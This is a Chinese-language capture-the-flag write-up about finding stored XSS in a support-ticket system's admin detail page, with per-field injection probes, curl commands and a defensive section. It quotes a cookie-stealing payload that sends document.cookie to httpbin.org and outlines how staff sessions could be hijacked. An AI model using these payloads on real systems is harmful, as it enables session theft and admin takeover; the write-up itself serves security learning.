# 04 · Logistics Company Admin Panel Compromise —— 同一份数据，两种渲染

> 系列第 4 题 · 对应真实事件：物流公司客服工单系统存储型 XSS 导致管理面板失守（原赏金 $18,000）
> · 我的净耗时：约 15 分钟

## 题面

> The company has a support system where customers can submit inquiries.
> Somewhere on the backend, staff members review these submissions.
> Your mission: gain access to the admin panel and capture the flag.

靶场地址：`https://<REDACTED_DOMAIN>/`

## 我的判断路径

"客户提交 → 员工后台查看"是最经典的存储型 XSS 场景。我的计划是：
**给每个字段分别注入带唯一标记的 HTML 探针，然后在每一个会渲染这份数据的视图里
检查转义情况**。关键词是"每一个视图"——这题差点栽在只看了一个视图上。

## 过程

### 1. 站点结构：一个工单表单 + 一个后台

首页只有一个工单提交表单（`title` / `description` / `category` 三个字段，
POST 到 `/api/submit-issue`），外加一个 `/admin` 链接。

`/admin` 是员工视角的工单列表页。列表上还能看到**其他玩家留下的注入尝试**——
比如一条 `fetch('https://httpbin.org/get?c='+document.cookie)`，
但它是被转义后的纯文本（`&lt;script&gt;…`），说明列表页对 category 做了 HTML 实体编码。

### 2. 分字段转义探测

我提交了一个带唯一标记的工单，三个字段各注入不同的 HTML 结构：

```json
{"title":     "MARK-title<b>bold</b>",
 "description": "MARK-desc<img src=x onerror=alert(1)>",
 "category":  "MARK-cat\"onmouseover=alert(2)"}
```

然后在 `/admin` 列表页检查渲染结果：

| 字段 | 列表页的表现 |
|---|---|
| category | 显示原文，引号被编码为 `&#34;` —— **已转义** |
| title | 根本不显示原文，只渲染成 "Issue #576" |
| description | **完全不渲染** |

到这里，列表页看起来"没问题"。如果我此时收工，就会得出"全站转义、无漏洞"的错误结论。

### 3. 找到第二个渲染视图：工单详情页

列表页的每条工单其实链到 `/admin/issue/{id}` 详情页——**员工逐条处理工单的地方**，
也是 XSS 真正的触发点。详情页的渲染结果完全不同：

```html
<div class="issue-title">MARK-title<b>bold</b></div>          ← 原样渲染
<div class="issue-description">MARK-desc<img src=x onerror=alert(1)></div>  ← 原样渲染
<span class="category-badge">MARK-cat&#34;…</span>            ← 仍然转义
```

**title 和 description 在详情页零转义**——`<b>` 生效、`<img onerror>` 成为可执行的
注入向量。页面甚至自带标注："This is a demonstration of a Blind XSS vulnerability.
The issue content is displayed without sanitization."

flag 就在详情页上（`<REDACTED>`）。

### 4. 真实攻击闭环应该是什么样

本题环境直接把 flag 展示在详情页，但真实场景的完整闭环是：

1. 攻击者提交含 `<script>` 的工单
2. 员工（或自动化机器人）打开详情页处理工单
3. 恶意 JS 在**员工已认证的会话**里执行
4. 窃取 `document.cookie`，或更优雅的方式——**直接以员工身份调用同源 API**：
   让 payload 把 `document.cookie` 作为新工单提交回来，攻击者在列表页就能读到，
   全程不需要外部回连服务器

第 2 题里那个试图把 cookie 发往 httpbin 的旧 payload，就是在走第 4 步的外部回连变体。

## 关键命令（脱敏后结构可复用）

```bash
# 分字段注入探针
curl -X POST https://<REDACTED_DOMAIN>/api/submit-issue \
  -H 'Content-Type: application/json' \
  -d '{"title":"MARK<b>t</b>","description":"MARK<img src=x onerror=1>","category":"Bug"}'

# 在所有渲染视图检查（列表页 + 详情页都要看！）
curl https://<REDACTED_DOMAIN>/admin | grep -A2 -B2 MARK
curl https://<REDACTED_DOMAIN>/admin/issue/{id} | grep -A2 -B2 MARK
```

## 失败与弯路

本题唯一的险情是**差点在列表页得出"无漏洞"结论**——列表页转义得很好，
但同一份数据在详情页完全裸奔。教训：**注入测试必须覆盖所有渲染该数据的视图**；
"某个视图安全"不构成"数据安全"的证据。

## 防御视角（如果我是蓝队）

1. 转义必须发生在**渲染层**且**逐视图落实**——最稳的方案是统一走模板引擎的
   自动转义（如 React 默认转义 / Jinja2 autoescape），禁止任何 `innerHTML` 直出
2. 富文本如确需渲染，服务端白名单净化（DOMPurify 类方案），而非黑名单过滤
3. 员工后台会话加 CSP（Content-Security-Policy）做纵深防御，即使 XSS 触发也限制外发
4. 工单系统属"外部输入 → 内部查看"的高危通道，值得上输入侧告警（检测 script 特征）

## 证据

- `evidence/04-1-flag-submitted.png` —— 提交成功页面
